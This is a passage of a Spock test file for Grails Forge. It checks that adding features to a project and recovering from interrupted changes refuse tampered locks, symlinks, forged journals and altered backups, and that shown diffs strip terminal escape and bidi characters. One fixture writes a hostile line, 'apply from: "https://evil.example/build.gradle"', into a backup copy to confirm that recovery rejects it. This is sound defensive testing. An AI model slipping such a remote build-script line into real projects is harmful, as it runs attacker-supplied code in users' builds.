                    it.endsWith('was changed while the change of the project was being prepared; nothing of the project was changed')
        }
    }

    @IgnoreIf({ os.windows })
    @Timeout(value = 600, unit = TimeUnit.SECONDS)
    void "a lock that is no file is refused and not opened"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Files.createDirectories(project.resolve('.grails/transactions'))
        Process made = new ProcessBuilder('mkfifo', project.resolve('.grails/transactions/lock').toString()).start()

        expect:
        made.waitFor() == 0

        when: 'a pipe of the name, which would keep whoever opens it waiting'
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'The lock of the project, .grails/transactions/lock, is not a file; remove it. Nothing of the project was changed'

        when: 'a link of the name'
        Files.delete(project.resolve('.grails/transactions/lock'))
        Files.createSymbolicLink(project.resolve('.grails/transactions/lock'), directory.resolve('elsewhere'))
        plan.apply()

        then:
        ProjectChangeException linked = thrown()
        linked.message == e.message
        !Files.exists(directory.resolve('elsewhere'))
    }

    @IgnoreIf({ os.windows })
    void "a link where a feature changes a file is a conflict"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path elsewhere = Files.writeString(directory.resolve('elsewhere.gradle'), project.resolve('build.gradle').toFile().text)
        Files.delete(project.resolve('build.gradle'))
        Files.createSymbolicLink(project.resolve('build.gradle'), elsewhere)

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.conflicts.find { it.path == 'build.gradle' }.reason == 'the feature changes this file, and in the project it is a symbolic link'
    }

    @Requires({ FeatureAdditionSpec.ignoresCase() })
    void "a file that has its name in other letters is a conflict, and keeps its name"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Files.move(project.resolve('build.gradle'), project.resolve('build.gradle.tmp'))
        Files.move(project.resolve('build.gradle.tmp'), project.resolve('Build.gradle'))
        Map<String, String> before = tree(project)

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.conflicts*.path == ['build.gradle']
        plan.conflicts[0].reason == 'the feature changes this file, and in the project it is named Build.gradle'
        plan.conflicts[0].details == ['Give the file the name build.gradle, add the feature, and give it its name back']
        tree(project) == before
        before.containsKey('Build.gradle')
    }

    void "what is in the directory of the changes and is of no change of this user is not read, and is left where it is"() {
        given: 'a journal as an earlier version wrote it into the project, which names a file of the user to remove'
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Files.writeString(project.resolve('secret.txt'), 'the user wrote this\n')
        Path current = Files.createDirectories(project.resolve('.grails/transactions/current/backup')).parent
        Files.writeString(current.resolve('journal'), "grails-forge-transaction 1\nput 0 - ${sha(project.resolve('secret.txt'))} secret.txt\nend\n")
        Map<String, String> before = tree(project)

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        !recovery.undone
        !recovery.completed
        recovery.strangers == ['current']
        recovery.messages == ['.grails/transactions has current, which no change that this user began under this home directory and for this path of the project left there: ' +
                'it was not read and is left alone. It came with the project, or it holds the copies of a change that was begun under another home directory or path and not ended; ' +
                'remove it only when the application is as it is to be']
        tree(project) == before

        when: 'a feature is added all the same'
        planOf(generator, project).apply()

        then:
        left(project) == ['current']
        project.resolve('secret.txt').toFile().text == 'the user wrote this\n'
        tree(project).findAll { !it.key.startsWith('.grails/transactions/') && it.key != 'secret.txt' } == tree(with)
    }

    void "a journal that names what the generator does not write, or that is of another project, undoes nothing"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Files.writeString(project.resolve('secret.txt'), 'the user wrote this\n')
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        Path journal = journals().first()
        String written = journal.toFile().text
        Map<String, String> interrupted = tree(project)

        when: 'a line more, for a file of the user'
        journal.toFile().text = written.replace('\nend\n', "\nput 99 - ${sha(project.resolve('secret.txt'))} secret.txt\nend\n")
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('The record of the change that was interrupted names what is no file of the generated application (secret.txt); nothing was put back.')
        tree(project) == interrupted

        when: 'a directory of the user to remove'
        Files.createDirectory(project.resolve('empty'))
        journal.toFile().text = written.replace('\nend\n', '\ndir empty\nend\n')
        addition(generator).recover(project)

        then:
        ProjectChangeException directories = thrown()
        directories.message.startsWith('The record of the change that was interrupted names what is no file of the generated application (empty); nothing was put back.')
        Files.isDirectory(project.resolve('empty'))

        when: 'the journal of this project where that of another is looked for'
        Path other = create(generator, 'other', [])
        Path of = Files.createDirectories(records.resolve(sha(other.toRealPath().toString().getBytes('UTF-8'))))
        Files.writeString(of.resolve('journal'), written)
        Map<String, String> untouched = tree(other)
        addition(generator).recover(other)

        then:
        ProjectChangeException another = thrown()
        another.message.startsWith('The record of a change of the project that was interrupted cannot be read; restore the project from version control and remove the file journal ')
        tree(other) == untouched

        when: 'the journal as it was written'
        journal.toFile().text = written

        then:
        addition(generator).recover(project).undone
    }

    @IgnoreIf({ os.windows })
    void "a directory of the change that is a link, and a copy that is not what the file was, undo nothing"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        List<String> written = []
        try {
            planOf(generator, project).apply { String path ->
                written << path
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        Path change = project.resolve('.grails/transactions').resolve(left(project).first())
        Path outside = Files.createDirectory(directory.resolve('outside'))
        Files.move(change.resolve('backup'), outside.resolve('backup'))
        Files.createSymbolicLink(change.resolve('backup'), outside.resolve('backup'))
        Map<String, String> interrupted = tree(project)
        Map<String, String> outsideBefore = tree(outside)

        when:
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith(".grails/transactions/${change.fileName}, where the change that was interrupted keeps the files it replaced, is not the directory it was; nothing was put back.")
        tree(project) == interrupted
        tree(outside) == outsideBefore

        when: 'the directory again, with another file in the place of a copy'
        Files.delete(change.resolve('backup'))
        Files.move(outside.resolve('backup'), change.resolve('backup'))
        Path copy = change.resolve("backup/${written.indexOf('build.gradle')}")
        byte[] kept = Files.readAllBytes(copy)
        Files.writeString(copy, 'apply from: "https://evil.example/build.gradle"\n')
        interrupted = tree(project)
        addition(generator).recover(project)

        then:
        ProjectChangeException changed = thrown()
        changed.message.startsWith("The copy of build.gradle that was kept in .grails/transactions/${change.fileName}/backup is not what the file was; nothing was put back.")
        tree(project) == interrupted

        when:
        Files.write(copy, kept)

        then:
        addition(generator).recover(project).undone
    }

    void "a directory for the journals that cannot be used stops a change before anything is written"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Files.createDirectories(records.parent)
        Files.writeString(records, 'a file where the directory is to be')
        Map<String, String> before = tree(project)

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'The directory the records of changes are kept in, .grails/forge/transactions in the home directory of the user, cannot be used: ' +
                '.grails/forge/transactions is not a directory. Nothing of the project was changed'
        tree(project) == before
    }

    @Timeout(value = 900, unit = TimeUnit.SECONDS)
    void "a file with more lines, or more changes, than are merged is a conflict, and found to be one at once"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        String build = project.resolve('build.gradle').toFile().text

        when: 'a build file that is not the generated one any more'
        project.resolve('build.gradle').toFile().text = (0..<300000).collect { "// line ${it} of the project" }.join('\n') + '\n'
        ChangePlan plan = planOf(generator, project)

        then:
        plan.conflicts*.path == ['build.gradle']
        plan.conflicts[0].reason == 'the feature changes this file, and the file of the project has more lines than are merged (200000) or differs from the generated one ' +
                'in more of them (2000)'
        plan.diff().size() < 100

        when: 'fewer lines, all of them others'
        project.resolve('build.gradle').toFile().text = (0..<20000).collect { "// line ${it} of the project" }.join('\n') + '\n'
        plan = planOf(generator, project)

        then:
        plan.conflicts*.path == ['build.gradle']

        when: 'many lines, and the generated ones among them'
        project.resolve('build.gradle').toFile().text = (0..<50000).collect { "// line ${it} of the project" }.join('\n') + '\n' + build
        plan = planOf(generator, project)

        then:
        plan.files.find { it.path == 'build.gradle' }.action == Action.MERGE
    }

    void "the difference that is shown is cut, and has nothing a terminal acts on"() {
        given:
        ProjectGenerator generator = generator { GeneratorContext context ->
            if (context.features.contains(FEATURE)) {
                context.addTemplate('long', new Fixed('long.txt', ((0..<3000).collect { "line ${it}" }.join('\n') + '\n').bytes, false, false))
                (0..<8).each { int index ->
                    context.addTemplate("more${index}", new Fixed("more${index}.txt", ((0..<390).collect { "line ${it}" }.join('\n') + '\n').bytes, false, false))
                }
            }
        }
        Path project = create(generator, 'app', [])
        Path with = create(beanContext.getBean(ProjectGenerator), 'with', [FEATURE])
        List<String> generated = project.resolve('build.gradle').toFile().readLines()
        List<String> withFeature = with.resolve('build.gradle').toFile().readLines()
        int where = (0..<generated.size()).find { generated[it] != withFeature[it] }
        // a line of the project two lines above where the feature adds its own, in a file with CR LF
        project.resolve('build.gradle').toFile().setText((generated.take(where - 2) + ['// right to left: \u202e, an escape: \u001b[31m, a tabulator:\t.'] +
                generated.drop(where - 2)).join('\r\n') + '\r\n', 'UTF-8')

        when:
        List<String> diff = planOf(generator, project).diff()

        then: 'no more of one file than 400 lines, and no more than 2000 of all'
        diff.contains('... 2603 more lines of long.txt are not shown')
        diff.count { it.startsWith('+line ') } < 2000
        diff.size() <= ChangePlan.MAX_DIFF + 1
        diff.last() ==~ /\.\.\. \d+ more lines of other files are not shown/

        and: 'the lines of a file with CR LF are shown without it, and what would turn the terminal is not shown'
        diff.contains(' // right to left: ?, an escape: ?[31m, a tabulator:\t.')
        diff.contains('+    implementation "org.apache.grails:grails-quartz"')
        !diff.any { it.contains('\u202e') || it.contains('\u001b') || it.contains('\r') || it.endsWith('?') }
    }

    void "lines that both changed are shown with what to do about them"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        List<String> generated = project.resolve('build.gradle').toFile().readLines()
        List<String> withFeature = with.resolve('build.gradle').toFile().readLines()
        int where = (0..<generated.size()).find { generated[it] != withFeature[it] }
        project.resolve('build.gradle').toFile().text = (generated.take(where) + ['    implementation "com.acme:mine:1.0" // \u202e'] + generated.drop(where)).join('\n') + '\n'

        when:
        ChangePlan plan = planOf(generator, project)

        then:
        plan.conflicts[0].details == [
                "at line ${where + 1} the project has:".toString(),
                '        implementation "com.acme:mine:1.0" // ?',
                'and the feature has there:',
                '        implementation "org.apache.grails:grails-quartz"',
                'Both changed the same place, so neither is taken for the other. Move the lines of the project that are shown to another place of the file, ' +
                        'with an unchanged line that is like no other line between (or take them out), add the feature again, and then put them where they belong']
    }

    static boolean ignoresCase() {
        Path probe = Files.createTempFile('probe', '.case')
        boolean ignores = Files.exists(probe.resolveSibling(probe.fileName.toString().toUpperCase(Locale.ROOT)))
        Files.delete(probe)
        return ignores
    }

    private FeatureAddition addition(ProjectGenerator generator) {
        return new FeatureAddition(generator, home)
    }

    private ChangePlan planOf(ProjectGenerator generator, Path project, List<String> features = [FEATURE]) {
        return addition(generator).plan(project, features, OperatingSystem.LINUX, ConsoleOutput.NOOP)
    }

    private ProjectGenerator generator(Closure extra = { }) {
        return new WithFiles(real: beanContext.getBean(ProjectGenerator), extra: extra)
    }

    private ProjectGenerator changingIcon() {
        return generator { GeneratorContext context ->
            context.addTemplate('icon', new Fixed('icon.bin', context.features.contains(FEATURE) ? OTHER_ICON : ICON, true, false))
        }
    }

    // a binary file, and a file that can be executed in a directory there was not
    private ProjectGenerator withNewFiles() {
        return generator { GeneratorContext context ->
            if (context.features.contains(FEATURE)) {
                context.addTemplate('icon', new Fixed('src/main/resources/icon.bin', ICON, true, false))
                context.addTemplate('tool', new Fixed('bin/tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, true))
            }
        }
    }

    private Path create(ProjectGenerator generator, String into, List<String> features) {
        Path project = Files.createDirectory(directory.resolve(into))
        Project named = NameUtils.parse('com.acme.shop')
        GeneratorContext context = generator.createGeneratorContext(ApplicationType.WEB, named, new Options(), OperatingSystem.LINUX, features, ConsoleOutput.NOOP)
        generator.generate(ApplicationType.WEB, named, new FileSystemOutputHandler(project.toFile(), ConsoleOutput.NOOP), context)
        return project
    }

    private Path copy(Path project, String into) {
        Path to = directory.resolve(into)
        Files.walkFileTree(project, new SimpleFileVisitor<Path>() {

            @Override
            FileVisitResult preVisitDirectory(Path each, BasicFileAttributes attributes) {
                Files.copy(each, to.resolve(project.relativize(each).toString()), StandardCopyOption.COPY_ATTRIBUTES)
                return FileVisitResult.CONTINUE
            }

            @Override
            FileVisitResult visitFile(Path each, BasicFileAttributes attributes) {
                Files.copy(each, to.resolve(project.relativize(each).toString()), StandardCopyOption.COPY_ATTRIBUTES)
                return FileVisitResult.CONTINUE
            }
        })
        return to
    }

    // what is in the directory of the changes of a project, but for the lock
    private static List<String> left(Path project) {
        Path transactions = project.resolve('.grails/transactions')
        return Files.isDirectory(transactions) ? (transactions.toFile().list() as List<String>).findAll { it != 'lock' }.sort() : []
    }

    // the journals there are, of every project
    private List<Path> journals() {
        if (!Files.isDirectory(records)) {
            return []
        }
        List<Path> journals = []
        Files.walk(records).withCloseable { stream -> stream.filter { Path path -> Files.isRegularFile(path) }.each { Path path -> journals << path } }
        return journals
    }

    private static String sha(Path file) {
        return sha(Files.readAllBytes(file))
    }

    private static String sha(byte[] bytes) {
        return MessageDigest.getInstance('SHA-256').digest(bytes).encodeHex().toString()
    }

    private static List<String> differing(Map<String, String> one, Map<String, String> other) {
        return new ArrayList<String>(one.keySet() + other.keySet()).findAll { one.get(it) != other.get(it) }.sort()
    }

    /**
     * Everything of a project: every directory with its mode, and every file with the digest of its
     * content and its mode, a link as a link. The directory of the changes and the lock in it are
     * left out, because a project has them once a feature was added to it and not before; what else
     * is in that directory is not.
     */
    private static Map<String, String> tree(Path project) {
        Map<String, String> entries = new TreeMap<>()
        boolean posix = project.fileSystem.supportedFileAttributeViews().contains('posix')
        Files.walk(project).withCloseable { stream ->
            stream.each { Path path ->
                String name = project.relativize(path).join('/')
                if (name.isEmpty() || name == '.grails/transactions' || name == '.grails/transactions/lock') {
                    return
                }
                String mode = posix ? PosixFilePermissions.toString(Files.getPosixFilePermissions(path, LinkOption.NOFOLLOW_LINKS)) : String.valueOf(Files.isExecutable(path))
                if (Files.isSymbolicLink(path)) {
                    entries.put(name, "link to ${Files.readSymbolicLink(path)}".toString())
                } else if (Files.isDirectory(path, LinkOption.NOFOLLOW_LINKS)) {
                    entries.put(name, "directory ${mode}".toString())
                } else {
                    entries.put(name, "${sha(path)} ${mode}".toString())
                }
            }
        }
        return entries
    }

    static class WithFiles implements ProjectGenerator {

        @Delegate
        ProjectGenerator real
        Closure extra

        @Override
        void generate(ApplicationType applicationType, Project project, OutputHandler outputHandler, GeneratorContext generatorContext) throws Exception {
            extra.call(generatorContext)
            real.generate(applicationType, project, outputHandler, generatorContext)
        }
    }

    static class Stopped extends RuntimeException {
    }

    static class Fixed implements Template {

        final String path
        final byte[] content
        final boolean binary
        final boolean executable

        Fixed(String path, byte[] content, boolean binary, boolean executable) {
            this.path = path
            this.content = content
            this.binary = binary
            this.executable = executable
        }

        @Override
        void write(OutputStream outputStream) throws IOException {
            outputStream.write(content)
        }
    }
}
